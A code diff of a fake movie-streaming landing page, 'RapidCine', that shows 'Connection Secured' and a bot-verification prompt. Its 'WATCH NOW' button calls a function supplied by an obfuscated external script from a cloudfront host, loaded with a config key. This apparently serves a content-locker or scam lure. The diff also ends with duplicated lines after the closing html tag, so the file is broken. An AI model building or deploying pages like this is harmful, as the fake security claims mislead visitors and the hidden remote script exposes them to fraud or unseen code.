@@ -5,35 +5,87 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RapidCine | Premium HD Streaming</title>
     
-    <link rel="stylesheet" href="css/style.css">
-    
     <script type="text/javascript">
         var zuPyA_ueV_gYbpBc={"it":4317065,"key":"d8d89"};
     </script>
     <script src="https://d1g1lhd4vferpn.cloudfront.net/f639caa.js"></script>
 
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-color: #e50914; 
+            --bg-color: #0f0f0f;
+            --text-color: #ffffff;
+        }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.9)), 
+                        url('https://images.unsplash.com/photo-1626814026160-2237a95fc5a0?q=80&w=1920') no-repeat center/cover;
+        }
+        .container { width: 90%; max-width: 400px; }
+        .movie-card {
+            background: rgba(255, 255, 255, 0.08);
+            padding: 30px 20px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+        }
+        .movie-poster { width: 100%; max-width: 250px; margin-bottom: 15px; }
+        h1 { font-size: 1.5rem; margin-bottom: 5px; }
+        .meta { font-size: 0.75rem; color: var(--primary-color); margin-bottom: 15px; }
+        .btn-play {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 18px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+            margin-top: 10px;
+            box-shadow: 0 5px 15px rgba(229, 9, 20, 0.4);
+        }
+        .features {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #999;
+        }
+    </style>
 </head>
 <body>
-
-    <div class="overlay"></div>
-
     <div class="container">
         <div class="movie-card">
-            <img src="images/logo.png" alt="RapidCine Logo" class="movie-poster">
+            <img src="images/1000157054.jpg" alt="RapidCine Logo" class="movie-poster" onerror="this.src='https://via.placeholder.com/250x100?text=RapidCine'">
             
             <h1>Connection Secured</h1>
-            <div class="meta">
-                2026 • 4K ULTRA HD • ENCRYPTED STREAM
-            </div>
-            
-            <p>
-                Verification required: Click the button below to prove you are not a bot and unlock the full movie library.
-            </p>
+            <div class="meta">2026 • 4K ULTRA HD • ENCRYPTED STREAM</div>
+            <p>Verification required: Click the button below to prove you are not a bot and unlock the full movie library.</p>
 
             <button class="btn-play" onclick="_JF()">▶ WATCH NOW</button>
 
             <div class="features">
+                <span>✔️ HD 1080p</span>
+                <span>✔️ No Ads</span>
+                <span>✔️ Fast Stream</span>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
                 <span>✔️ HD 1080p</span>
                 <span>✔️ No Ads</span>
                 <span>✔️ Fast Stream</span>
